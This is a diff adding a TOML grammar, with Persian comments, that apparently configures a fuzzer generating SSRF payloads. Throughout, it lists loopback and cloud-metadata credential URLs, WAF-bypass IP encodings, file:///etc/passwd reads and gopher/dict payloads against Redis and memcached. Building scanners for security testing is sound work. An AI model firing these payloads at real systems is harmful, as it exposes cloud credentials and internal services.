@@ -1,0 +1,127 @@
+[grammar]
+name = "ssrf"
+sink_category = "ssrf"
+
+[[contexts]]
+name = "url_param"
+prefix = ""
+suffix = ""
+
+# ========== تکنیک‌های پایه ==========
+[[techniques]]
+name = "loopback_ipv4"
+template = "http://127.0.0.1/{port}"
+weight = 1.0
+
+[[techniques]]
+name = "loopback_ipv6"
+template = "http://[::1]/{port}"
+weight = 1.0
+
+[[techniques]]
+name = "localhost"
+template = "http://localhost/{port}"
+weight = 1.0
+
+# ========== متادیتای ابرها ==========
+[[techniques]]
+name = "aws_metadata"
+template = "http://169.254.169.254/latest/meta-data/{path}"
+weight = 2.0
+
+[[techniques]]
+name = "gcp_metadata"
+template = "http://metadata.google.internal/computeMetadata/v1/{path}"
+weight = 2.0
+headers = ["Metadata-Flavor: Google"]
+
+[[techniques]]
+name = "azure_metadata"
+template = "http://169.254.169.254/metadata/instance{path}"
+weight = 2.0
+
+# ========== IP variations (bypass WAF) ==========
+[[techniques]]
+name = "decimal_ip"
+template = "http://2130706433/{port}"
+weight = 1.5
+
+[[techniques]]
+name = "octal_ip"
+template = "http://0177.0.0.1/{port}"
+weight = 1.5
+
+[[techniques]]
+name = "hex_ip"
+template = "http://0x7f000001/{port}"
+weight = 1.2
+
+[[techniques]]
+name = "ip_with_zero"
+template = "http://127.0.0.0/{port}"   # بعضی‌ها 0 رو قبول می‌کنند
+weight = 0.8
+
+[[techniques]]
+name = "bypass_at"
+template = "http://google.com@127.0.0.1/{port}"
+weight = 1.2
+
+[[techniques]]
+name = "bypass_slash"
+template = "http://127.0.0.1/{port}@evil.com"
+weight = 0.9
+
+[[techniques]]
+name = "bypass_dot"
+template = "http://127。0.0。1/{port}"   # نقطه چینی
+weight = 1.0
+
+# ========== پروتکل‌های دیگر ==========
+[[techniques]]
+name = "file_protocol_linux"
+template = "file:///etc/passwd"
+weight = 1.5
+
+[[techniques]]
+name = "file_protocol_windows"
+template = "file:///c:/windows/win.ini"
+weight = 1.2
+
+[[techniques]]
+name = "dict_protocol"
+template = "dict://127.0.0.1:11211/{port}"  # memcached
+weight = 0.8
+
+[[techniques]]
+name = "gopher_redis"
+template = "gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a"
+weight = 0.6
+
+[[techniques]]
+name = "ftp_protocol"
+template = "ftp://127.0.0.1/{port}"
+weight = 0.7
+
+# ========== متغیرها برای تولید پویا ==========
+[[variables]]
+name = "port"
+values = ["", "80", "8080", "443", "25", "22", "3306", "6379", "9200"]
+weight_by_value = [2.0, 1.0, 0.8, 0.5, 0.4, 0.3, 0.5, 0.6, 0.4]
+
+[[variables]]
+name = "path"
+values = ["", "iam/security-credentials/", "user-data", "meta-data/public-keys/", "public-keys"]
+weight_by_value = [1.0, 2.0, 1.5, 0.8, 0.5]
+
+# ========== رمزگذاری‌ها ==========
+[[encodings]]
+name = "raw"
+transform = "identity"
+
+[[encodings]]
+name = "double_url"
+transform = "double_url_encode"   # اگر پشتیبانی شود
+
+[[encodings]]
+name = "base64"
+transform = "base64_encode"
